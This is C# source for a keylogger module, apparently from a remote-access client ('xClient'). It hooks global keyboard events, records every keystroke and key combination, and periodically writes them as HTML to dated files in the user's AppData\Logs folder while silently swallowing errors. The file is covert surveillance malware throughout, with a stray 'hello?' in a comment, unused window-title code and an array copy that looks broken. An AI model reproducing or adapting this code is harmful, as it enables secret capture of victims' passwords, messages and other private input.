using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace xClient.Core.Keylogger
{
    /// <summary>
    /// Ties together the logic used to log keyboard input with the
    /// logic used to manipulate the output
    /// </summary>
    public class Logger : IDisposable
    {
        public static Logger Instance;
        private bool disposed = false;

        private StringBuilder _logFileBuffer;
        private string _hWndTitle;
        private string _hWndLastTitle;

        private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                            "\\Logs\\";

        private readonly System.Timers.Timer _timerFlush;

        private List<Keys> PressedKeys = new List<Keys>();

        private IKeyboardMouseEvents m_Events;

        /// <summary>
        /// Creates the logging class that provides keylogging functionality.hello?
        /// </summary>
        public Logger(double flushInterval)
        {
            Instance = this;
            _hWndLastTitle = string.Empty;

            WriteFile();

            this._logFileBuffer = new StringBuilder();

            this._timerFlush = new System.Timers.Timer { Interval = flushInterval };
            this._timerFlush.Elapsed += this.timerFlush_Elapsed;

            Unsubscribe();
            Subscribe(Hook.GlobalEvents());

            _timerFlush.Enabled = true;
            _timerFlush.Start();
        }

        ~Logger()
        {
            // If Dispose() is called, we won't reach here and performance will not be
            // hit. This is here if Dispose() did not get called when it should have.
            // It is a safe-guard because we want to make sure we unsubscribe from these
            // things or the client may not be able to get keystrokes/mouse clicks to any
            // other application (including Windows).
            Dispose(true);
        }

        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposed)
            {
                if (disposing)
                {
                    if (_timerFlush != null)
                    {
                        _timerFlush.Dispose();
                    }

                    Unsubscribe();

                    disposed = true;
                }
            }
        }

        private void Subscribe(IKeyboardMouseEvents events)
        {
            m_Events = events;
            m_Events.KeyDown += OnKeyDown;
            m_Events.KeyUp += OnKeyUp;
            m_Events.KeyPress += Logger_KeyPress;

            // To-Do: Log these in a readable manner... Perhaps the location etc.
            //m_Events.MouseDown += OnMouseDown;
            //m_Events.MouseUp += OnMouseUp;
            //m_Events.MouseClick += OnMouseClick;
            //m_Events.MouseDoubleClick += OnMouseDoubleClick;

            //m_Events.MouseMove += HookManager_MouseMove;
            //m_Events.MouseWheel += HookManager_MouseWheel;

            //m_Events.MouseDownExt += HookManager_Supress;
        }

        private void Unsubscribe()
        {
            if (m_Events == null) return;

            m_Events.KeyDown -= OnKeyDown;
            m_Events.KeyUp -= OnKeyUp;
            m_Events.KeyPress -= Logger_KeyPress;

            // To-Do: Log these in a readable manner... Perhaps the location etc.
            //m_Events.MouseDown -= OnMouseDown;
            //m_Events.MouseUp -= OnMouseUp;
            //m_Events.MouseClick -= OnMouseClick;
            //m_Events.MouseDoubleClick -= OnMouseDoubleClick;

            //m_Events.MouseMove -= HookManager_MouseMove;
            //m_Events.MouseWheel -= HookManager_MouseWheel;

            //m_Events.MouseDownExt -= HookManager_Supress;
            m_Events.Dispose();
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            PressedKeys.Add(e.KeyCode);
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            _logFileBuffer.Append(HighlightSpecialKeys(PressedKeys.ToArray()));

            PressedKeys.Remove(e.KeyCode);
        }

        private void Logger_KeyPress(object sender, KeyPressEventArgs e)
        {
            _logFileBuffer.Append(e.KeyChar + " ");
        }

        private string HighlightSpecialKeys(Keys[] _names)
        {
            string[] names = new string[_names.Length];
            Array.Copy(_names, names, _names.Length);

            return HighlightSpecialKeys(names);
        }

        private string HighlightSpecialKeys(string[] names)
        {
            if (names.Length < 1) return string.Empty;

            StringBuilder specialKeys = new StringBuilder();

            int ValidSpecialKeys = 0;
            for (int i = 0; i < names.Length; i++)
            {
                if (!string.IsNullOrEmpty(names[i]))
                {
                    if (ValidSpecialKeys == 0)
                    {
                        specialKeys.AppendFormat("<font color=\"0000FF\">([{0}] ", names[i]);
                    }
                    else
                    {
                        specialKeys.AppendFormat("+ [{0}]", names[i]);
                    }

                    ValidSpecialKeys++;
                }
            }

            // If there are items in the special keys string builder, give it an ending
            // font tag and some trailing white-space.
            if (ValidSpecialKeys > 0)
            {
                specialKeys.Append(")</font> ");
            }

            return specialKeys.ToString();
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = _filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(_filePath))
                    Directory.CreateDirectory(_filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                            {
                                sw.Write("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                         DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");

                                if (_logFileBuffer.Length > 0)
                                    sw.Write(_logFileBuffer);

                                _hWndLastTitle = string.Empty;
                            }
                            else
                                sw.Write(_logFileBuffer);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }

            _logFileBuffer = new StringBuilder();
        }

        private string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            WinApi.ThreadNativeMethods.GetWindowText(WinApi.ThreadNativeMethods.GetForegroundWindow(), sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();

            return title != string.Empty ? title : null;
        }
    }
}